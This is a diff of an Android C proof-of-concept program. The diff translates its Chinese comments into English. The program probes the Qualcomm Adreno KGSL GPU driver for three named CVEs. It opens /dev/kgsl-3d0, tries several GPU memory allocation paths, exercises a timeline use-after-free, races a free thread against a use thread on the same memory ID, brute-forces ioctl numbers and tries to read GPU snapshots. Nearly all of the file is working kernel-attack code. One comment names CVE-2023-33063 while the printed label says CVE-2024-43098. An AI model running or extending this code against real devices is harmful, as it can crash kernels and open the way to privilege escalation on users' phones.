@@ -1,16 +1,16 @@
 /*
- * kgsl_uaf_poc.c - KGSL UAF 漏洞探測 PoC
+ * kgsl_uaf_poc.c - KGSL UAF vulnerability probe PoC
  *
- * 目標 CVE:
+ * Target CVEs:
  * - CVE-2023-33063: KGSL Use-After-Free
  * - CVE-2023-33107: KGSL Integer Overflow leading to UAF
  * - CVE-2024-23380: KGSL OOB Write
  *
- * 設備資訊:
+ * Device information:
  * - GPU: Adreno 621v1
- * - /dev/kgsl-3d0 O_RDWR 可用
+ * - /dev/kgsl-3d0 O_RDWR is available
  *
- * 編譯:
+ * Build:
  * aarch64-linux-android31-clang -static -O2 -o kgsl_uaf_poc kgsl_uaf_poc.c
  */
 
@@ -31,7 +31,7 @@
 /* KGSL Magic */
 #define KGSL_IOC_TYPE 0x09
 
-/* 標準的 KGSL ioctl 定義 */
+/* standard KGSL ioctl definitions */
 #define IOCTL_KGSL_DEVICE_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)
 #define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
 #define IOCTL_KGSL_DRAWCTXT_DESTROY _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)
@@ -63,7 +63,7 @@
 #define KGSL_MEMFLAGS_USERMEM_ION 0x100000
 #define KGSL_MEMFLAGS_USERMEM_ASHMEM 0x180000
 
-/* 結構定義 */
+/* structure definitions */
 struct kgsl_device_getproperty
 {
     unsigned int type;
@@ -172,12 +172,12 @@ struct kgsl_timeline_wait
     unsigned int padding;
 };
 
-/* 全局變量 */
+/* global variables */
 int g_kgsl_fd = -1;
 unsigned int g_context_id = 0;
 volatile int g_race_flag = 0;
 
-/* 創建 drawing context */
+/* create a drawing context */
 int create_context(void)
 {
     struct kgsl_drawctxt_create ctx = {0};
@@ -193,19 +193,19 @@ int create_context(void)
     return -1;
 }
 
-/* 銷毀 context */
+/* destroy the context */
 void destroy_context(unsigned int id)
 {
     struct kgsl_drawctxt_destroy ctx = {.drawctxt_id = id};
     ioctl(g_kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &ctx);
 }
 
-/* 嘗試分配 GPU 記憶體 - 使用不同方法 */
+/* try to allocate GPU memory - using different methods */
 void test_gpumem_allocation(void)
 {
     printf("\n=== Testing GPU Memory Allocation ===\n");
 
-    /* 方法 1: GPUMEM_ALLOC */
+    /* Method 1: GPUMEM_ALLOC */
     struct kgsl_gpumem_alloc alloc1 = {0};
     alloc1.size = 0x1000;
     alloc1.flags = 0;
@@ -214,7 +214,7 @@ void test_gpumem_allocation(void)
     printf("[*] GPUMEM_ALLOC: ret=%d, errno=%d, gpuaddr=0x%lx\n",
            ret, errno, alloc1.gpuaddr);
 
-    /* 方法 2: GPUMEM_ALLOC_ID */
+    /* Method 2: GPUMEM_ALLOC_ID */
     struct kgsl_gpumem_alloc_id alloc2 = {0};
     alloc2.size = 0x1000;
     alloc2.flags = 0;
@@ -223,7 +223,7 @@ void test_gpumem_allocation(void)
     printf("[*] GPUMEM_ALLOC_ID: ret=%d, errno=%d, id=%u, gpuaddr=0x%lx\n",
            ret, errno, alloc2.id, alloc2.gpuaddr);
 
-    /* 方法 3: GPUOBJ_ALLOC (新 API) */
+    /* Method 3: GPUOBJ_ALLOC (new API) */
     struct kgsl_gpuobj_alloc alloc3 = {0};
     alloc3.size = 0x1000;
     alloc3.flags = 0;
@@ -232,13 +232,13 @@ void test_gpumem_allocation(void)
     printf("[*] GPUOBJ_ALLOC: ret=%d, errno=%d, id=%u\n",
            ret, errno, alloc3.id);
 
-    /* 方法 4: 使用 ashmem + MAP_USER_MEM */
+    /* Method 4: use ashmem + MAP_USER_MEM */
     int ashmem_fd = open("/dev/ashmem", O_RDWR);
     if (ashmem_fd >= 0)
     {
         printf("[+] Opened /dev/ashmem: fd=%d\n", ashmem_fd);
 
-        // 設置 ashmem 名稱和大小
+        // Set the ashmem name and size
         ioctl(ashmem_fd, 0x41007701, "kgsl_test"); // ASHMEM_SET_NAME
         ioctl(ashmem_fd, 0x40087703, 0x10000);     // ASHMEM_SET_SIZE
 
@@ -249,7 +249,7 @@ void test_gpumem_allocation(void)
         {
             printf("[+] Mapped ashmem at %p\n", ashmem_ptr);
 
-            // 嘗試註冊到 KGSL
+            // Try to register it with KGSL
             struct
             {
                 unsigned long gpuaddr;
@@ -273,7 +273,7 @@ void test_gpumem_allocation(void)
     }
 }
 
-/* 嘗試 CVE-2023-33063 風格的 UAF */
+/* Try a CVE-2023-33063-style UAF */
 void test_timeline_uaf(void)
 {
     printf("\n=== Testing Timeline UAF (CVE-2024-43098 style) ===\n");
@@ -290,7 +290,7 @@ void test_timeline_uaf(void)
     }
     printf("[+] Timeline created: id=%u\n", create.id);
 
-    // 嘗試 wait 操作
+    // Try a wait operation
     struct kgsl_timeline_wait wait = {0};
     uint64_t timeline_data[2] = {create.id, 0};
     wait.timelines = (uint64_t)timeline_data;
@@ -300,12 +300,12 @@ void test_timeline_uaf(void)
     ret = ioctl(g_kgsl_fd, IOCTL_KGSL_TIMELINE_WAIT, &wait);
     printf("[*] Timeline wait: ret=%d, errno=%d\n", ret, errno);
 
-    // 銷毀 timeline
+    // Destroy the timeline
     ret = ioctl(g_kgsl_fd, IOCTL_KGSL_TIMELINE_DESTROY, &create.id);
     printf("[*] Timeline destroy: ret=%d\n", ret);
 }
 
-/* 嘗試觸發 race condition */
+/* Try to trigger a race condition */
 void *race_thread_free(void *arg)
 {
     unsigned int *id = (unsigned int *)arg;
@@ -315,7 +315,7 @@ void *race_thread_free(void *arg)
         usleep(1);
     }
 
-    // 快速釋放
+    // Free quickly
     ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, id);
     return NULL;
 }
@@ -329,7 +329,7 @@ void *race_thread_use(void *arg)
         usleep(1);
     }
 
-    // 同時使用
+    // Use concurrently
     struct kgsl_gpumem_get_info info = {0};
     info.id = *id;
     ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_GET_INFO, &info);
@@ -342,7 +342,7 @@ void test_race_condition(void)
 
     for (int i = 0; i < 10; i++)
     {
-        // 分配記憶體
+        // Allocate memory
         struct kgsl_gpumem_alloc_id alloc = {0};
         alloc.size = 0x1000;
         alloc.flags = 0;
@@ -368,14 +368,14 @@ void test_race_condition(void)
     printf("[*] Race condition test completed\n");
 }
 
-/* 掃描更多潛在的 ioctl */
+/* scan for more potential ioctls */
 void scan_advanced_ioctls(void)
 {
     printf("\n=== Scanning Advanced IOCTLs ===\n");
 
     char buf[1024] = {0};
 
-    // 重點掃描 0x50-0x60 範圍 (GPUOBJ 相關)
+    // Focus the scan on the 0x50-0x60 range (GPUOBJ related)
     unsigned int sizes[] = {16, 32, 48, 64, 80, 0};
 
     for (int s = 0; sizes[s] != 0; s++)
@@ -399,7 +399,7 @@ void scan_advanced_ioctls(void)
     }
 }
 
-/* 嘗試讀取 GPU 快照 */
+/* try to read the GPU snapshot */
 void try_read_gpu_snapshot(void)
 {
     printf("\n=== Trying to Read GPU Snapshot ===\n");
@@ -441,28 +441,28 @@ int main(int argc, char **argv)
     }
     printf("[+] Opened /dev/kgsl-3d0: fd=%d\n", g_kgsl_fd);
 
-    // 創建 context
+    // Create a context
     g_context_id = create_context();
 
-    // 測試 GPU 記憶體分配
+    // Test GPU memory allocation
     test_gpumem_allocation();
 
-    // 測試 timeline UAF
+    // Test the timeline UAF
     test_timeline_uaf();
 
-    // 測試 race condition
+    // Test the race condition
     if (argc > 1 && strcmp(argv[1], "-r") == 0)
     {
         test_race_condition();
     }
 
-    // 掃描高級 ioctl
+    // Scan the advanced ioctls
     scan_advanced_ioctls();
 
-    // 讀取 GPU 快照
+    // Read the GPU snapshot
     try_read_gpu_snapshot();
 
-    // 清理
+    // Clean up
     if (g_context_id > 0)
     {
         destroy_context(g_context_id);
